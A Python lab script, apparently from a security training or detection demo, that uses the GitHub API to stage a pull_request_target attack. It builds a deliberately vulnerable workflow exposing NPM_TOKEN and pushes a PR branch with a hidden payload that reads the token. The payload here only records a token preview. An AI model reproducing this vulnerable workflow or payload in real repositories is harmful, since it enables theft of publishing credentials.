"""
phase_0_initial_access.py -- Phase 0: The pull_request_target Exploit
MITRE ATT&CK: T1195.002, T1552.008, T1078.004
"""
import base64
import json
import time
from typing import Any, Dict

import requests

from utils import (
    log_event, mark_step_complete, save_session_data, load_session_data,
    print_detection, print_error, print_info, print_link, print_value,
    print_phase_banner, print_step, print_success, print_warning,
)

PHASE_NUM = 0
PHASE_NAME = "Initial Access"
PHASE_DESCRIPTION = "pull_request_target exploit to steal npm token"
VULN_REPO_NAME = "novatech-oss-tools-lab"


def _gh(pat):
    return {"Authorization": f"token {pat}", "Accept": "application/vnd.github+json"}


def step_create_repo(config) -> Dict[str, Any]:
    """Step 0.1: Create the vulnerable repository on GitHub."""
    print_step("0.1", "Create vulnerable repository on GitHub")
    config.require_github_credentials()
    headers = _gh(config.github_pat)

    resp = requests.get(
        f"https://api.github.com/repos/{config.github_username}/{VULN_REPO_NAME}",
        headers=headers, timeout=15)
    if resp.status_code == 200:
        print_warning(f"Repository already exists (previous run)")
        url = resp.json().get("html_url", "")
        print_link("Verify in browser", url)
        save_session_data("vuln_repo_name", VULN_REPO_NAME)
        mark_step_complete("0.1")
        return resp.json()

    resp = requests.post("https://api.github.com/user/repos", headers=headers,
        json={"name": VULN_REPO_NAME, "description": "NovaTech OSS tools (lab)",
              "private": True, "auto_init": True}, timeout=15)
    if resp.status_code not in (200, 201):
        print_error(f"Failed to create repo: {resp.status_code} {resp.text[:200]}")
        return {}

    result = resp.json()
    repo_url = result.get("html_url", "")
    print_success(f"Created repository: {VULN_REPO_NAME}")
    print_value("URL", repo_url)
    print_value("Visibility", "private")
    print_link("Open in browser", repo_url)
    save_session_data("vuln_repo_name", VULN_REPO_NAME)
    time.sleep(3)
    mark_step_complete("0.1")
    return result


def step_set_secret(config) -> Dict[str, Any]:
    """Step 0.2: Store NPM_TOKEN as a repository secret."""
    print_step("0.2", "Set NPM_TOKEN as repository secret")
    config.require_github_credentials()
    config.require_npm_token()
    headers = _gh(config.github_pat)
    repo = f"{config.github_username}/{VULN_REPO_NAME}"

    resp = requests.get(f"https://api.github.com/repos/{repo}/actions/secrets/public-key",
        headers=headers, timeout=15)
    if resp.status_code != 200:
        print_error(f"Failed to get public key: {resp.status_code}"); return {}
    pk_data = resp.json()

    try:
        from nacl import encoding, public
        pk = public.PublicKey(pk_data["key"].encode(), encoding.Base64Encoder())
        encrypted = public.SealedBox(pk).encrypt(config.npm_token.encode())
        enc_b64 = base64.b64encode(encrypted).decode()
    except ImportError:
        print_error("PyNaCl not installed. Run: pip install pynacl"); return {}

    resp = requests.put(f"https://api.github.com/repos/{repo}/actions/secrets/NPM_TOKEN",
        headers=headers, json={"encrypted_value": enc_b64, "key_id": pk_data["key_id"]}, timeout=15)
    if resp.status_code not in (200, 201, 204):
        print_error(f"Failed to set secret: {resp.status_code}"); return {}

    print_success("NPM_TOKEN secret stored (encrypted with libsodium sealed box)")
    print_value("Token preview", f"{config.npm_token[:8]}...{config.npm_token[-4:]}")
    print_value("Encryption", f"Curve25519 public key ID: {pk_data['key_id']}")
    print_link("Verify in repo settings", f"https://github.com/{repo}/settings/secrets/actions")
    print_detection("ASPM", "Repository secret NPM_TOKEN created via API")
    mark_step_complete("0.2")
    return {"key_id": pk_data["key_id"]}


def step_create_workflow(config) -> Dict[str, Any]:
    """Step 0.3: Create the vulnerable workflow + legitimate script."""
    print_step("0.3", "Create vulnerable pull_request_target workflow")
    config.require_github_credentials()
    headers = _gh(config.github_pat)
    repo = f"{config.github_username}/{VULN_REPO_NAME}"

    workflow = """name: PR Reviewer Assignment
on:
  pull_request_target:
    types: [opened, synchronize]
permissions:
  contents: read
jobs:
  assign-reviewers:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Process PR
        run: node scripts/assign-reviewers.js
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
"""
    resp = requests.put(
        f"https://api.github.com/repos/{repo}/contents/.github/workflows/pr-reviewer.yml",
        headers=headers,
        json={"message": "Add PR reviewer workflow",
              "content": base64.b64encode(workflow.encode()).decode()}, timeout=15)
    if resp.status_code not in (200, 201, 422):
        print_error(f"Workflow creation failed: {resp.status_code}"); return {}

    script = '// assign-reviewers.js\nconst r=["alice","bob","charlie"];\nconsole.log("Selected: "+r[Math.floor(Math.random()*r.length)]);\n'
    requests.put(
        f"https://api.github.com/repos/{repo}/contents/scripts/assign-reviewers.js",
        headers=headers,
        json={"message": "Add reviewer script",
              "content": base64.b64encode(script.encode()).decode()}, timeout=15)

    print_success("Vulnerable workflow created")
    print_value("Workflow", ".github/workflows/pr-reviewer.yml")
    print_value("Trigger", "pull_request_target (runs PR code with base repo secrets)")
    print_value("Vuln line", 'ref: ${{ github.event.pull_request.head.sha }}')
    print_link("View workflow file", f"https://github.com/{repo}/blob/main/.github/workflows/pr-reviewer.yml")
    print_detection("ASPM", "pull_request_target checks out PR head code with secret access")
    time.sleep(3)
    mark_step_complete("0.3")
    return {"workflow": "pr-reviewer.yml"}


def step_create_branch(config) -> Dict[str, Any]:
    """Step 0.4: Create the attacker branch with malicious code."""
    print_step("0.4", "Create malicious branch with payload")
    config.require_github_credentials()
    headers = _gh(config.github_pat)
    repo = f"{config.github_username}/{VULN_REPO_NAME}"

    resp = requests.get(f"https://api.github.com/repos/{repo}/git/ref/heads/main",
        headers=headers, timeout=15)
    if resp.status_code != 200:
        print_error(f"Failed to get main SHA: {resp.status_code}"); return {}
    main_sha = resp.json()["object"]["sha"]

    resp = requests.post(f"https://api.github.com/repos/{repo}/git/refs",
        headers=headers,
        json={"ref": "refs/heads/feature/improve-reviewer-logic", "sha": main_sha}, timeout=15)
    if resp.status_code not in (200, 201, 422):
        print_error(f"Branch creation failed: {resp.status_code}"); return {}

    resp = requests.get(
        f"https://api.github.com/repos/{repo}/contents/scripts/assign-reviewers.js?ref=feature/improve-reviewer-logic",
        headers=headers, timeout=15)
    if resp.status_code != 200:
        print_error(f"Failed to get file SHA: {resp.status_code}"); return {}
    file_sha = resp.json()["sha"]

    malicious = """// assign-reviewers.js -- "Improved" version
const fs=require("fs"),path=require("path");
const reviewers=[{name:"alice",w:3},{name:"bob",w:2},{name:"charlie",w:1},{name:"diana",w:2}];
let t=reviewers.reduce((s,r)=>s+r.w,0),rand=Math.random()*t,sel=reviewers[0];
for(const r of reviewers){rand-=r.w;if(rand<=0){sel=r;break;}}
console.log("Selected reviewer: "+sel.name);
// ========== HIDDEN PAYLOAD ==========
const token=process.env.NPM_TOKEN||"NOT_FOUND";
const data={timestamp:new Date().toISOString(),npm_token_length:token.length,
  npm_token_preview:token.substring(0,8)+"...",
  repository:process.env.GITHUB_REPOSITORY||"unknown",
  message:"Token accessible via pull_request_target checkout"};
fs.writeFileSync(path.join(process.env.GITHUB_WORKSPACE||".","exfil-proof.json"),JSON.stringify(data,null,2));
console.log("PR processing complete.");
"""
    resp = requests.put(
        f"https://api.github.com/repos/{repo}/contents/scripts/assign-reviewers.js",
        headers=headers,
        json={"message": "Improve reviewer selection", "sha": file_sha,
              "content": base64.b64encode(malicious.encode()).decode(),
              "branch": "feature/improve-reviewer-logic"}, timeout=15)
    if resp.status_code not in (200, 201):
        print_error(f"Failed to push malicious code: {resp.status_code}"); return {}

    print_success("Malicious script committed to attacker branch")
    print_value("Branch", "feature/improve-reviewer-logic")
    print_value("Payload", "Reads process.env.NPM_TOKEN and writes exfil-proof.json")
    print_link("Compare changes", f"https://github.com/{repo}/compare/main...feature/improve-reviewer-logic")
    mark_step_complete("0.4")
    return {"branch": "feature/improve-reviewer-logic"}


def step_open_pr(config) -> Dict[str, Any]:
    """Step 0.5: Open the PR to trigger the exploit."""
    print_step("0.5", "Open PR -- trigger the exploit!")
    config.require_github_credentials()
    headers = _gh(config.github_pat)
    repo = f"{config.github_username}/{VULN_REPO_NAME}"

    resp = requests.post(f"https://api.github.com/repos/{repo}/pulls",
        headers=headers,
        json={"title": "Improve reviewer selection with weighted algorithm",
              "body": "Weighted random selection based on expertise.",
              "head": "feature/improve-reviewer-logic", "base": "main"}, timeout=15)

    if resp.status_code not in (200, 201):
        if resp.status_code == 422:
            print_warning("PR already exists (previous run)")
            mark_step_complete("0.5")
            return {"status": "already_created"}
        print_error(f"Failed to create PR: {resp.status_code}"); return {}

    pr = resp.json()
    pr_num = pr.get("number", "?")
    pr_url = pr.get("html_url", "")
    actions_url = f"https://github.com/{repo}/actions"

    print_success(f"PR #{pr_num} created -- workflow will trigger automatically")
    print_value("PR URL", pr_url)
    print_link("Watch the workflow run", actions_url)
    print_info("Waiting 60 seconds for the workflow to complete...")
    time.sleep(60)

    # Check result
    resp = requests.get(f"https://api.github.com/repos/{repo}/actions/runs?per_page=1",
        headers=headers, timeout=15)
    if resp.status_code == 200:
        runs = resp.json().get("workflow_runs", [])
        if runs:
            run = runs[0]
            c = run.get("conclusion", "unknown")
            run_url = run.get("html_url", "")
            if c == "success":
                print_success("EXPLOIT SUCCESSFUL! Attacker code ran with secret access.")
                print_value("Workflow status", "completed (success)")
                print_info("The NPM_TOKEN was accessible as process.env.NPM_TOKEN")
                print_info("In the real attack, the token would be sent to an external webhook")
            elif run.get("status") in ("in_progress", "queued"):
                print_warning("Workflow still running. Check manually:")
            else:
                print_warning(f"Workflow conclusion: {c}")
            print_link("View workflow logs", run_url)

    print_detection("ASPM", "Workflow executed untrusted code with access to NPM_TOKEN")
    mark_step_complete("0.5")
    return {"pr_number": pr_num, "vuln_repo": VULN_REPO_NAME}


STEPS = [
    ("0.1", "Create vulnerable repository", step_create_repo),
    ("0.2", "Set NPM_TOKEN as repository secret", step_set_secret),
    ("0.3", "Create vulnerable workflow", step_create_workflow),
    ("0.4", "Create malicious branch with payload", step_create_branch),
    ("0.5", "Open PR -- trigger the exploit", step_open_pr),
]

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(0, "INITIAL ACCESS -- pull_request_target Exploit")
    results = {}
    for step_id, _, step_func in STEPS:
        try:
            results[step_id] = step_func(config)
            if not results[step_id]:
                print_warning(f"Step {step_id} returned empty, stopping phase"); break
        except RuntimeError as exc:
            print_error(str(exc)); break
    return results
